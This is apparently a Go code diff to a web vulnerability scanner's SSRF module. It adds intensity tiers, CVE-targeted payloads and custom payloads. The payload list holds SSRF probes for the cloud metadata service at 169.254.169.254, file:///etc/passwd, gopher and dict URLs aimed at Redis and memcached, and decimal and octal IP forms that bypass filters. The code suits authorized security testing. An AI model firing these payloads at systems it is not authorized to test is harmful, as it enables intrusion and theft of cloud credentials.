@@ -44,6 +44,8 @@ type SSRFScanner struct {
 	PageCountMu sync.Mutex
 	MaxDepth    int
 	Payloads    []string
+	Intensity   int
+	TargetedCVEs []string
 	Throttle    time.Duration
 }
 
@@ -53,8 +55,7 @@ type ssrfCrawlJob struct {
 	Depth int
 }
 
-// NewSSRFScanner creates a new instance of the SSRF scanner
-func NewSSRFScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration) (*SSRFScanner, error) {
+func NewSSRFScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration, intensity int, targetedCVEs []string, customPayloads []string) (*SSRFScanner, error) {
 	parsed, err := url.Parse(start)
 	if err != nil {
 		return nil, err
@@ -63,17 +64,21 @@ func NewSSRFScanner(start string, workers, maxPages, maxDepth int, throttle time
 		Timeout: 20 * time.Second,
 	}
 
+	payloads := generateSSRFPayloads(intensity, targetedCVEs, customPayloads)
+
 	s := &SSRFScanner{
-		StartURL: parsed,
-		Client:   client,
-		Visited:  make(map[string]bool),
-		Queue:    make(chan ssrfCrawlJob, 1000),
-		Findings: []FindingSSRF{},
-		Workers:  workers,
-		MaxPages: maxPages,
-		MaxDepth: maxDepth,
-		Throttle: throttle,
-		Payloads: generateSSRFPayloads(),
+		StartURL:     parsed,
+		Client:       client,
+		Visited:      make(map[string]bool),
+		Queue:        make(chan ssrfCrawlJob, 1000),
+		Findings:     []FindingSSRF{},
+		Workers:      workers,
+		MaxPages:     maxPages,
+		MaxDepth:     maxDepth,
+		Throttle:     throttle,
+		Payloads:     payloads,
+		Intensity:    intensity,
+		TargetedCVEs: targetedCVEs,
 	}
 	return s, nil
 }
@@ -248,31 +253,50 @@ func (s *SSRFScanner) detectSSRF(body string) (string, bool) {
 	return "", false
 }
 
-func generateSSRFPayloads() []string {
-	return []string{
+func generateSSRFPayloads(intensity int, targetedCVEs []string, customPayloads []string) []string {
+	var payloads []string
+
+	// CVE-specific payloads
+	for _, id := range targetedCVEs {
+		if cve, ok := GetCVEDatabase()[id]; ok && cve.Type == ScannerSSRF {
+			payloads = append(payloads, cve.Payloads...)
+		}
+	}
+
+	base := []string{
 		"http://127.0.0.1",
 		"http://localhost",
-		"http://127.0.0.1:80",
-		"http://127.0.0.1:22",
-		"http://127.0.0.1:3306",
 		"http://169.254.169.254/latest/meta-data/",
-		"http://169.254.169.254/latest/user-data/",
-		"http://[::1]",
-		"http://0.0.0.0",
-		"file:///etc/passwd",
-		"file:///C:/Windows/win.ini",
-		"dict://127.0.0.1:11211/",
-		"sftp://127.0.0.1:22/",
-		"tftp://127.0.0.1:69/",
-		"ldap://127.0.0.1:389/",
-		"gopher://127.0.0.1:6379/_",
-		// Bypasses
-		"http://2130706433", // Decimal IP
-		"http://0177.0.0.1", // Octal IP
-		"http://127.1",
-		"http://localtest.me",
-		"http://vcap.me",
 	}
+
+	if intensity > 2 {
+		base = append(base, []string{
+			"http://127.0.0.1:80",
+			"http://127.0.0.1:22",
+			"http://127.0.0.1:3306",
+			"http://169.254.169.254/latest/user-data/",
+			"http://[::1]",
+			"http://0.0.0.0",
+		}...)
+	}
+
+	if intensity > 3 {
+		base = append(base, []string{
+			"file:///etc/passwd",
+			"dict://127.0.0.1:11211/",
+			"gopher://127.0.0.1:6379/_",
+			"http://2130706433", // Decimal IP
+			"http://0177.0.0.1", // Octal IP
+			"http://localtest.me",
+		}...)
+	}
+
+	payloads = append(payloads, base...)
+	if len(customPayloads) > 0 {
+		payloads = append(payloads, customPayloads...)
+	}
+
+	return payloads
 }
 
 func (s *SSRFScanner) markVisited(u string) bool {
